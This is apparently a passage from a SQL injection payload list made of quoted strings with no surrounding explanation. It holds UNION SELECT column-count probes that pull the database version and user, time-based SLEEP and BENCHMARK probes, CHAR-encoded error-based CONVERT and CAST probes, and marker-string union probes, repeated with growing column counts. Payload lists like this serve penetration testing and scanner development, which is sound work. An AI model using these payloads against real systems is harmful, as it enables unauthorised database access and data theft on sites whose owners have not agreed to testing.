"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
"UNION SELECT @@VERSION,SLEEP(5),USER(),4#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
"UNION ALL SELECT USER()-- ",
"UNION ALL SELECT SLEEP(5)-- ",
"UNION ALL SELECT USER(),SLEEP(5)-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
"UNION ALL SELECT NULL-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- ",
"UNION ALL SELECT NULL#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#",
"UNION ALL SELECT NULL ",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))",
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",
"AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",
"AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)",
"AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",
"UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX'",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- ",
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- ",
